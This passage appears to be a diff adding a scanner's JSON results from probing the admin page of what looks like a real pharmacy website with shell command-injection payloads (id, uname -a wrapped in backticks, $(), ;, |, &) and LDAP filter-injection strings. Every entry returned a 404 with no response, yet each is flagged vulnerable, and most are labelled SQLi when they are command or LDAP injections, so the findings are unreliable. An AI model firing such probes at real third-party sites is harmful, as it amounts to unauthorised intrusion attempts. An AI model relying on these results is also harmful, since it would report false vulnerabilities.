+    "vuln_type": "SQLi",
+    "response_time_ms": 66,
+    "response": null
+  },
+  {
+    "payload": "` id `",
+    "url": "https://kpharmacyllc.com/admin.html?test=%60+id+%60",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 65,
+    "response": null
+  },
+  {
+    "payload": "$( id )",
+    "url": "https://kpharmacyllc.com/admin.html?test=%24%28+id+%29",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 67,
+    "response": null
+  },
+  {
+    "payload": "; uname -a",
+    "url": "https://kpharmacyllc.com/admin.html?test=%3B+uname+-a",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 70,
+    "response": null
+  },
+  {
+    "payload": "| uname -a",
+    "url": "https://kpharmacyllc.com/admin.html?test=%7C+uname+-a",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 68,
+    "response": null
+  },
+  {
+    "payload": "& uname -a",
+    "url": "https://kpharmacyllc.com/admin.html?test=%26+uname+-a",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "*)(&",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%26",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 68,
+    "response": null
+  },
+  {
+    "payload": "` uname -a `",
+    "url": "https://kpharmacyllc.com/admin.html?test=%60+uname+-a+%60",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 70,
+    "response": null
+  },
+  {
+    "payload": "*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "XSS",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "$( uname -a )",
+    "url": "https://kpharmacyllc.com/admin.html?test=%24%28+uname+-a+%29",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "*)(|(objectClass=*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectClass%3D%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 69,
+    "response": null
+  },
+  {
+    "payload": "*)(|",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 70,
+    "response": null
+  },
+  {
+    "payload": "*)(|(objectClass=user",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectClass%3Duser",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 67,
+    "response": null
+  },
+  {
+    "payload": "*)(|(cn=*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28cn%3D%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 68,
+    "response": null
+  },
+  {
+    "payload": "*)(|(objectClass=group",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectClass%3Dgroup",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 73,
+    "response": null
+  },
+  {
+    "payload": "*)(|(uid=*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28uid%3D%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "*)(|(sAMAccountName=*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28sAMAccountName%3D%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 71,
+    "response": null
+  },
+  {
+    "payload": "*)(|(objectCategory=*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectCategory%3D%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 69,
+    "response": null
+  },
+  {
+    "payload": "*)(|(member=*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28member%3D%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "*)(|(memberOf=*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28memberOf%3D%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 72,
+    "response": null
+  },
+  {
+    "payload": "*)(|(objectSid=*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectSid%3D%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 69,
+    "response": null
+  },
+  {
+    "payload": "*)(|(objectGUID=*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectGUID%3D%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 68,
+    "response": null
+  },
+  {
+    "payload": "*)(|(mail=*",
+    "url": "https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28mail%3D%2A",
+    "status_code": 404,
+    "vulnerable": true,
+    "vuln_type": "SQLi",
+    "response_time_ms": 84,
+    "response": null
+  }
+]
